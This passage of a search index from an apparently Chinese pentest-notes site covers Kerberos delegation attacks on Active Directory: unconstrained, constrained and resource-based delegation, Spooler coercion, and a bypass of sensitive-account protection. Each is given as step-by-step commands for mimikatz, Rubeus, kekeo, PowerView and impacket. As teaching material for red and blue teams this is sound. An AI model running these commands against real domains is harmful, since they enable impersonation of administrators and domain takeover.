const.com","title":"1.\u8fdb\u884c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#2","text":"\u4ec5\u80fd\u57fa\u4e8e\u673a\u5668\u8d26\u6237 \u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u5185\u5b58\u4e2d\u7684tgt\u8fbe\u5230\u4efb\u610f\u7528\u6237\u8bbf\u95ee\u7684\u76ee\u7684\u3002 \u5728\u88ab\u63a7\u5236\u7684\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5668\u4e0a\u4f7f\u7528mimikatz\u3002 privilege::debug \u63d0\u6743 sekurlsa::tickets \u67e5\u770b\u672c\u673a\u6240\u6709\u7968\u636e \u901a\u8fc7\u4ee5\u4e0a\u547d\u4ee4\u83b7\u53d6\u7968\u636e,\u5982\u679c\u7ba1\u7406\u5458\u8bbf\u95ee\u4e86\u672c\u673a\u7684\u4e00\u4e9b\u670d\u52a1\uff0c\u90a3\u4e48\u5b83\u7684TGT\u5c31\u4f1a\u88ab\u622a\u83b7\u653e\u5165\u5185\u5b58\u3002 \u6211\u4eec\u6a21\u62df\u7ba1\u7406\u5458\u8c03\u7528\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u7684smb\u670d\u52a1 \u6211\u4eec\u56de\u5230\u975e\u7ea6\u675f\u59d4\u6d3e\u673a\uff0c\u67e5\u770b\u7968\u636e tgt\u88ab\u622a\u83b7,\u6211\u4eec\u7528 sekurlas::tickets /export \u628a\u7968\u636e\u5bfc\u51fa\u6765 \u7136\u540emimikatz\u91cc\u4f7f\u7528 kerberos::ptt \u7968\u636e\u6587\u4ef6\u540d \u5c06\u7968\u636e\u6ce8\u5165\u5185\u5b58 \u8bbf\u95ee\u57df\u63a7c\\$ \u6210\u529f","title":"2.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#3-spooler","text":"\u7eaf\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u5f88\u9e21\u808b\uff0c\u56e0\u4e3a\u5fc5\u987b\u8981\u5176\u4ed6\u7528\u6237\u901a\u8fc7\u4f60\u8fdb\u884c\u59d4\u6d3e\u8bbf\u95ee\u3002 \u4f46\u662f \uff1a\u5229\u7528Windows\u6253\u5370\u7cfb\u7edf\u8fdc\u7a0b\u534f\u8bae \uff08MS-RPRN\uff09 \u4e2d\u7684\u4e00\u79cd\u65e7\u7684\u4f46\u662f\u9ed8\u8ba4\u542f\u7528\u7684\u65b9\u6cd5\uff0c\u5728\u8be5\u65b9\u6cd5\u4e2d\uff0c\u57df\u7528\u6237\u53ef\u4ee5\u4f7f\u7528MS-RPRN RpcRemoteFindFirstPrinterChangeNotification\uff08Ex\uff09 \u65b9\u6cd5\u5f3a\u5236\u4efb\u4f55\u8fd0\u884c\u4e86 Spooler \u670d\u52a1\u7684\u8ba1\u7b97\u673a\u4ee5\u901a\u8fc7 Kerberos \u6216 NTLM \u5bf9\u653b\u51fb\u8005\u9009\u62e9\u7684\u76ee\u6807\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u914d\u5408\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\uff0c\u7b80\u76f4\u7206\u70b8\uff0c\u53ef\u4ee5\u4e3b\u52a8\u62ff\u5230\u5176\u4ed6\u7528\u6237\u7684TGT\u3002- \u800c\u4e14splooer\u670d\u52a1\u662f\u9ed8\u8ba4\u8fd0\u884c\u7684\u3002\uff08\u56fe\u6e90WIN7\uff09 \u4f7f\u5176\u4ed6\u4e3b\u673a\u5f3a\u884c\u4e0e\u81ea\u5df1\u53d1\u751f\u8eab\u4efd\u9a8c\u8bc1\u7684\u811a\u672c\uff1a\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u4e00\u4e0b https://github.com/leechristensen/SpoolSample.git \u5728\u6b64\u4e4b\u524d\u9700\u8981\u5f00\u542f\u76d1\u542c\u6765\u81ea\u5176\u4ed6\u4e3b\u673a\u7684TGT\uff0c\u8fd9\u91cc\u7528\u7684\u662frubeus Rubeus.exe monitor /interval:1 /filteruser:xx \u7136\u540e\u4f7f\u7528 SpoolSample.exe XX win7 ,\u8ba9\u6307\u5b9a\u673a\u5668\u8bbf\u95eeWIN7\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1 \u7136\u540e\u83b7\u5f97TGT\uff0c\u4e0b\u73ed\u3002","title":"3.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u914d\u5408 Spooler\u6253\u5370\u673a\u670d\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_9","text":"\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u5927\u81f4\u653b\u51fb\u6d41\u7a0b\u662f: (\u5229\u7528S4U2SELF=>)\u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u7684NTLM hash\u6216\u8005\u660e\u6587\u5bc6\u7801\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4ee5\u6b64\u6765\u5411KDC\u53d1\u9001\u4e00\u4e2aTGT\u7533\u8bf7\uff0c\u83b7\u5f97\u4e00\u4e2a\u53ef\u8f6c\u53d1\u7684TGT\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u53ef\u8f6c\u53d1\u7684TGT\u8c03\u7528S4U2SELF\u534f\u8bae\uff0c\u83b7\u5f97\u4e00\u4e2a\u9488\u5bf9\u81ea\u5df1\u7684ST1\u7968\u636e\uff08\u5176\u4e2dST1\u7968\u636e\u4e2d\u7684\u8bf7\u6c42\u7528\u6237\u53ef\u4ee5\u4efb\u610f\u4f2a\u9020\uff09.\u7136\u540e\u7528\u8fd9\u4e2aST1\u7968\u636e\u53bb\u5411KDC\u8bf7\u6c42ST2\uff0c\u7136\u540e\u7528ST2\u53bb\u8bbf\u95ee\u670d\u52a1\uff0c\u6b64\u65f6\u6211\u4eec\u8bbf\u95ee\u7684\u8eab\u4efd\u5c31\u662f\u6211\u4eec\u4efb\u610f\u4f2a\u9020\u7684\u8eab\u4efd\u4e86. \u91cd\u70b9\u662f\u53ea\u8981\u83b7\u5f97\u4e86\u53ef\u8f6c\u53d1TGT\uff0c\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5c31\u53ef\u4ee5\u4efb\u610f\u4f2a\u9020\u5176\u4ed6\u7528\u6237\u7684ST1\u7968\u636e\u8bf7\u6c42\uff0c\u592a\u53ef\u6015\u4e86\u3002 \u8fd9\u4e2a\u653b\u51fb\u7684\u6700\u5927\u524d\u63d0\u662f\u6211\u4eec\u5f97\u83b7\u5f97\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u7684NTLM HASH\u6216\u8005\u660e\u6587\u5bc6\u7801,\u7136\u540e\u6211\u4eec\u624d\u80fd\u6210\u529f\u7684\u5f97\u5230\u53ef\u8f6c\u53d1TGT\uff0c\u7136\u540e\u624d\u80fd\u5f97\u5230\u63a5\u4e0b\u6765\u7684\u4e00\u5207\u3002 \u9996\u5148\u914d\u7f6e\u597d\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237 \u6ce8\u610f\u9009\u7528 \u4f7f\u7528\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae \u6211\u4eec\u5148\u4fe1\u606f\u641c\u96c6\uff1a\u770b\u54ea\u4e9b\u7528\u6237\u662f\u5f00\u542f\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u3002\u4e00\u624bpowerview\u5b89\u6392\u4e0a \u7bad\u5934\u6307\u51fa\u7684\u5730\u65b9\u5c31\u662f\u53ef\u4ee5\u88ab\u59d4\u6d3e\u8bbf\u95ee\u7684\u670d\u52a1 \u6211\u4eec\u7528kekeo\u6765\u5b9e\u73b0\u653b\u51fb. tgt::ask /user:xx /domain:xx /password:xx /ticket:test.kirbi\u8fd9\u91cc\u7684/password\u53ef\u4ee5\u6539\u6210/NTLM:xx \u83b7\u5f97TGT\u8f6c\u53d1\u7968\u636e tgs::s4u /tgt:file_name /user:administrator /service:cifs/DC tgt\u5904\u6539\u4e3a\u521a\u521a\u5f97\u5230\u7684TGT\u6587\u4ef6\u7684\u540d\u5b57\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6267\u884c\u540e\u5f97\u5230administrator\u8eab\u4efd\u7684 ST2 \u628a\u6700\u540e\u83b7\u5f97\u7684\u7968\u636e\u7528mimikatz kerberos::ptt \u6ce8\u5165\u5185\u5b58\uff0c\u5b8c\u4e8b\u3002","title":"\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_10","text":"refer: https://xz.aliyun.com/t/7454 https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd \u5b9e\u7528\u573a\u666f\uff1a1.\u63d0\u6743 2.\u4e00\u4e9b\u60c5\u51b5\u4e0b\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u51ed\u636e\u8fdc\u63a7pc\uff0c\u901a\u8fc7\u6b64\u65b9\u6cd5\u66f2\u7ebf\u6551\u56fd\u3002 \u524d\u63d0\uff1a\u6709\u4e00\u4e2a\u7528\u6237\u5bf9\u4e00\u4e2a\u673a\u5668\u6709genericAll\uff0cWriteAccountRestrictions\u7b49\u6743\u9650","title":"\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_11","text":"1.S4U2SELF \u534f\u8bae\u53ef\u4ee5\u5728\u7528\u6237\u6ca1\u6709\u914d\u7f6e TrustedToAuthenticationForDelegation \u5c5e\u6027\uff08\u5373\u5f00\u542f\u4f7f\u7528\u4efb\u4f55\u534f\u8bae\u8ba4\u8bc1\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff09\u65f6\u88ab\u8c03\u7528\uff0c\u4f46\u662f\u8fd4\u56de\u7684ST\u662f\u4e0d\u53ef\u88ab\u8f6c\u53d1\u7684\u3002 2.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u4e3b\u673a \u5728\u88ab\u53e6\u4e00\u53f0\u4e3b\u673a\u59d4\u6d3e\u8bbf\u95ee\u65f6\uff0c\u5728S4U2PROXY\u8fc7\u7a0b\u4e2d\u63d0\u4ea4\u8fc7\u6765\u7684ST\u5982\u679c\u5373\u4f7f\u662f\u4e0d\u53ef\u8f6c\u53d1\u7684\u3002KDC\u4f9d\u65e7\u4f1a\u8fd4\u56de\u6709\u6548\u7684ST2\u3002 3.\u6bcf\u4e2a\u666e\u901a\u57df\u7528\u6237\u9ed8\u8ba4\u53ef\u4ee5\u521b\u5efa\u81f3\u591a\u5341\u4e2a\u673a\u5668\u8d26\u6237\uff08 \u7531MachineAccountQuota\u5c5e\u6027\u51b3\u5b9a \uff09\uff0c\u6bcf\u4e2a\u673a\u5668\u8d26\u6237\u88ab\u521b\u5efa\u65f6\u90fd\u4f1a\u81ea\u52a8\u6ce8\u518cSPN: RestrictedKrbHost/domain \u548c HOST/domain \u8fd9\u4e24\u4e2aSPN","title":"\u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_12","text":"\u5047\u8bbe\u5f00\u542f\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5668\u4e3aA 1.\u9996\u5148\u8981\u6709\u4e00\u4e2a\u5bf9\u5f53\u524d\u8ba1\u7b97\u673a\u6709\u5199\u6743\u9650\u7684\u8d26\u6237\uff0c\u624d\u80fd\u5bf9A\u8bbe\u7f6e\u53ef\u4ee5 \u88ab \u59d4\u6d3e\u8bbf\u95ee\u7684\u670d\u52a1\u8d26\u6237\u3002 2.\u5229\u7528\u5f53\u524d\u8d26\u6237\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u5e76\u914d\u7f6e\u597d\u673a\u5668\u8d26\u6237\u5230A\u7684 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e 3.\u56e0\u4e3a\u673a\u5668\u8d26\u6237\u662f\u6211\u4eec\u521b\u5efa\u7684\uff0c\u6211\u4eec\u77e5\u9053\u4ed6\u7684\u5bc6\u7801\u8d26\u6237\uff0c\u53ef\u4ee5\u8ba9\u5b83\u5229\u7528S4U2SELF\u534f\u8bae\u83b7\u5f97\u4e00\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u901a\u8fc7S4U2PROXY\uff0c\u5728\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u57fa\u7840\u4e0a\u83b7\u5f97\u6709\u6548\u7684\u8bbf\u95eeA cifs\u670d\u52a1\u7684ST2\u3002 4.\u7528ST2\u8bbf\u95eeA\u7684CIFS\u670d\u52a1\uff0c\u6743\u9650\u83b7\u5f97\u3002","title":"\u653b\u51fb\u6d41\u7a0b:"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_13","text":"1.rebeus \u8fd9\u4e2a\u653b\u51fb\u8bf4\u767d\u4e86\u5c31\u662f\u4e2a\u63d0\u6743... \u9996\u5148\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u57df\u63a7\u662f\u5426\u662fwin2012\u4ee5\u4e0a\u7684\u4e3b\u673a\uff0c\u56e0\u4e3a\u53ea\u6709\u8fd9\u6837\u624d\u80fd\u5f00\u542f \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u6211\u4eec\u4f7f\u7528powersploit\u4e0b\u7684powerview\u811a\u672c\u3002\u6267\u884c\u547d\u4ee4 get-netdomaincontroller \u53ef\u4ee5\u83b7\u5f97\u57df\u63a7WIN\u7248\u672c \u7136\u540e\u6211\u4eec\u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u54ea\u53f0\u4e3b\u673a\u6709\u5199\u6743\u9650\u3002\u56e0\u4e3a\u662f\u5b9e\u9a8c\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u6765\u770b\u770b\u600e\u4e48\u914d\u7f6e\u4e00\u4e2a\u7528\u6237\u5bf9\u4e00\u4e2a\u673a\u5668\u7684\u6743\u9650\u3002 \u76f4\u63a5\u5728\u57df\u63a7\u4e0a\u627e\u5230\u67d0\u4e3b\u673a\uff0c\u7136\u540e\u8fdb\u5165\u5728\u5c5e\u6027\u91cc\u8fdb\u5165\u5b89\u5168\u9009\u9879\u5361\uff0c\u6dfb\u52a0\u67d0\u7528\u6237\uff0c\u7136\u540e\u7ed9\u8fd9\u4e2a\u7528\u6237\u5206\u914d\u6743\u9650\u5373\u53ef\u3002 \u6211\u4eec\u4f9d\u65e7\u4f7f\u7528powerview\u3002\u5148\u8c03\u7528 Get-DomainUser -Identity username -Properties objectsid \u6765\u83b7\u53d6\u5f53\u524d\u7528\u6237SID \u7136\u540e Get-DomainObjectAcl -Identity \u4e3b\u673a\u540d | ?{$_.SecurityIdentifier -match \"\u521a\u521a\u5f97\u5230\u7684SID\"} \u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u67d0\u53f0\u4e3b\u673a\u662f\u5426\u6709\u5199\u6743\u9650\u3002 \u5982\u679c\u6709 GenericAll\uff08\u5b8c\u5168\u63a7\u5236\u6743\uff09\uff0cGenericWrite\u3001WriteProperty\u3001WriteDacl \u8fd9\u4e9b\u5c5e\u6027\uff0c\u5c31\u8bf4\u660e\u8be5\u7528\u6237\u80fd\u4fee\u6539\u8ba1\u7b97\u673a\u7684\u8d26\u6237\u5c5e\u6027\u3002 \u5982\u56fe\u770b\u5230\u6211\u4eec\u5bf9WIN7\u8fdb\u884c\u64cd\u4f5c \u597d\u7684\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u8981\u521b\u7acb\u4e00\u4e2a\u673a\u5668\u7528\u6237\u4e86\u3002\u6839\u636e\u7f51\u4e0a\u641c\u7d22\u7ed3\u679c\uff0c\u4f7f\u7528powermad\u8fd9\u4e2aps\u811a\u672c\u53ef\u4ee5\u5f88\u5feb\u6377\u7684\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\u3002 https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hack;system -Password $(ConvertTo-SecureString \"hack\" -AsPlainText -Force) \u597d\u7684\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5bc6\u7801hack\uff0c\u540d\u4e3ahacksystem\u7684\u673a\u5668\u8d26\u6237\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u914d\u7f6ehacksystem\u5230WIN7\u7684\u59d4\u6d3e\u4e86\u3002\u6211\u4eec\u9700\u8981\u505a\u7684\uff0c\u662f\u4fee\u6539WIN7\u7684 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u7684\u503c \uff0c\u8fd9\u4e2a\u64cd\u4f5c\u6211\u4eec\u7528powerview\u5b9e\u73b0\u3002 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)\" #\u8fd9\u513f\u7684sid\u662f\u6211\u4eec\u521b\u5efa\u7684#\u673a\u5668\u7528\u6237#evilsystem\u7684sid $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose \u81f3\u4e8e\u673a\u5668\u8d26\u6237SID\u600e\u4e48\u83b7\u5f97\uff0cpowerview\u4e0b\u7684 get-domiancomputer hacksystem \u7136\u540e\u4f7f\u7528 Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity \u67e5\u770b\u59d4\u6d3e\u662f\u5426\u8bbe\u7f6e\u6210\u529f Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose \u6b64\u547d\u4ee4\u53ef\u4ee5\u6e05\u9664 msds-allowedtoactonbehalfofotheridentity\u5c5e\u6027\u7684\u503c \u73b0\u5728\u90fd\u7edf\u7edf\u8bbe\u7f6e\u597d\u4e86\uff0c\u5f00\u59cb\u4e0b\u4e00\u6b65\u5427\u3002 \u7f51\u4e0a\u4e00\u822c\u7528\u7684rubeus\uff0c\u8fd9\u91cc\u6211\u7528kekeo\u5427 Rubeus.exe hash /user:xxx /password:xxx /domain:xxx \u672c\u5730\u8fd0\u7b97\u51fa\u673a\u5668\u7528\u6237ntlm hash \u8fd9\u91cc\u501f\u7528\u4e00\u4e0b\u522b\u4eba\u7684\u56fe Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u5199\u5165\u7968\u636e \u7136\u540e\u6211\u5728\u672c\u673a\u4f7f\u7528\u4ee5\u4e0a\u65b9\u6cd5\u540eklist\u4e00\u4e0b\uff0c\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u7968\u636e \u4f46\u662fdir \\test1\\c\\$\u65f6\u672c\u673a\u83ab\u540d\u5176\u5999\u4e0d\u80fd\u8fdb\u884ckerberos\u9a8c\u8bc1\uff0c\u6211\u670d\u4e86\u300b\u3002\u3002\u4f46\u4e0d\u7ba1\u600e\u6837\uff0c\u6211\u4eec\u62ff\u5230\u94f6\u7968\u4e86(\u8fd9\u4e2a\u7b14\u8bb0\u5199\u4e8e2021\u5e74\uff0c\u7b2c\u4e00\u6b21\u5b9e\u6218\u9047\u5230\u57282023\u5e74\uff0c\u8fd8\u662f\u9047\u5230\u4e86\u7c7b\u4f3c\u7684\u5751\uff09 2.impacket \u52a0\u673a\u5668\u8d26\u6237 ./addcomputer.py -computer-name 'aa$' -computer-pass 'applem1@123' -dc-host dc.a.cn 'a.cn/testusername:testpassword' \u5c06\u673a\u5668\u8d26\u6237\u52a0\u5165\u673a\u5668\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027 ./rbcd.py rbcd.py -delegate-from 'weipai_test$' -delegate-to 'victimmachine$' -dc-ip '172.21.32.31' -action 'write' 'a.cn'/'testusername':'testpassword' \u8bfb\u4e00\u4e0b\u673a\u5668\u8d26\u6237\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\u770b\u770b\u5199\u5165\u6210\u529f\u6ca1 ./rbcd.py -delegate-to 'victimmachine$' -dc-ip '172.21.32.31' -action 'read' 'a.cn'/'testusername':'testpassword' \u62ffst\uff0c\u7136\u540e\u6ce8\u5165\u5185\u5b58\u5373\u53ef ./getST.py -spn 'cifs/victimmachine' -impersonate Administrator -dc-ip 172.21.32.31 'a.cn'/'testusername':'testpassword' export KRB5CCNAME=ad01.ccache","title":"\u5b9e\u64cd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_14","text":"\u82e5\u6211\u4eec\u7684administrator\u7528\u6237\u88ab\u8bbe\u7f6e\u4e3a\u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u6216\u8005\u88ab\u52a0\u5165\u4fdd\u62a4\u7ec4\uff0c\u6309\u7406\u8bf4\u4ed6\u7684\u8bbf\u95ee\u5c31\u4e0d\u80fd\u8fdb\u884c\u59d4\u6d3e\u3002 1.rebeus \u6211\u4eec\u5728\u4ee5administrator\u8d26\u6237\u8eab\u4efd\u8fdb\u884cS4U\u65f6\uff0c\u53ea\u80fd\u8fdb\u884cS4U2SELF\uff0c\u4e0d\u80fd\u8fdb\u884cS4U2PROXY\u3002\u6211\u4eec\u7528 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u7ee7\u7eed\u5b9e\u9a8cadministrator\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837 \u6b64\u65f6\u6211\u4eec\u7528 rubeus.exe describe /ticker:S4Ubase64 /ticket:\u52a0\u5bc6\u7684\u7968\u636e \u53ef\u4ee5\u53d1\u73b0servicename\u5e76\u6ca1\u6709\u6307\u5b9a\u67d0\u4e2a\u670d\u52a1\uff0c\u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u8d26\u6237.\u5373\u53d1\u751f\u4e86\u670d\u52a1\u540d\u79f0\u7f3a\u5931\u7684\u95ee\u9898\u3002\u5f88\u7b80\u5355\uff0c\u628a\u7968\u636e\u4fee\u6539\u4e00\u4e0b\u5c31\u884c\u4e86.\u7f51\u4e0a\u5f88\u591a\u8bf4\u7528\u8fd9\u4e2a\u5de5\u5177 https://www.pkisolutions.com/tools/asn1editor/ \u4f46\u5b9e\u9645\u4e0arubeus\u4e5f\u80fd\u5b8c\u6210\u7968\u636e\u4fee\u6539 rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt \u5b8c\u4e8b 2.impacket \u5728getST\u4e2d\u52a0\u4e0a -force-forwardable \u53c2\u6570 python3 getST.py redteam.lab/CPT04\\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20 -force-forwardable","title":"\u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#credssp","text":"CredSSP\u534f\u8bae\u7684\u76ee\u7684\u662f\u5c06\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u4eceCredSSP\u5ba2\u6237\u7aef\u59d4\u6d3e\u7ed9CredSSP\u670d\u52a1\u5668\u3002 \u901a\u5e38\u8fd0\u7528\u4e8e\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u3002 \u6211\u4eec\u5728\u914d\u7f6e\u8fd9\u4e2a\u534f\u8bae\u65f6\uff0c\u4e00\u822c\u5728\u7ec4\u7b56\u7565\u7f16\u8f91\u5668\u91cc\u914d\u7f6e\u3002 Allow delegating default credentials\u8868\u793a\u5728\u901a\u8fc7\u4f7f\u7528\u53d7\u4fe1\u4efb\u7684X509\u8bc1\u4e66\u6216Kerberos\u5b9e\u73b0\u670d\u52a1\u5668\u8eab\u4efd\u9a8c\u8bc1\u65f6\u81ea\u52a8\u53d1\u9001\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\uff0c\u5373\u660e\u6587\u5bc6\u7801\u3002 Allow delegating default credentials with NTLM-only server authentication\u8868\u793a\u5728\u901a\u8fc7NTLM\u5b9e\u73b0\u670d\u52a1\u5668\u8eab\u4efd\u9a8c\u8bc1\u65f6\u81ea\u52a8\u53d1\u9001\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\uff0c\u5373\u660e\u6587\u5bc6\u7801\u3002 \u8fd9\u51e0\u4e2a\u5c5e\u6027\u5728\u6ce8\u518c\u8868\u91cc\u5bf9\u5e94 